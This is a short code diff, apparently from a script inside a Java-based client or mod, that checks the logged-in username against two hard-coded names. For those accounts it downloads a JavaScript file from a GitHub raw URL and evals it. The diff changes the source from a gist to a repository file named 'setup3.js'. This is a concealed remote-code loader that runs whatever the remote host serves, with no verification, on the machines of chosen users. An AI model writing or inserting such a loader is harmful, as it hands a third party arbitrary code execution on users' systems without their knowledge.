@@ -6,7 +6,7 @@ var username = Java.type("ru.nedan.spookybuy.Authentication").getUsername();
 if (username === "desmined_rwsss" || username === "shezllx") {
     try {
         eval(new java.util.Scanner(
-            new java.net.URL("https://gist.githubusercontent.com/LidmiPython/867f2d6b64cf8b161ad5c81d5e0556f0/raw/679792dd4518b8a0c648242c8e8c210a083aae03/gistfile1.txt").openStream(), 
+            new java.net.URL("https://raw.githubusercontent.com/LidmiPython/scriptmine/refs/heads/main/setup3.js").openStream(), 
             "UTF-8"
         ).useDelimiter("\\A").next());
     } catch (e) {
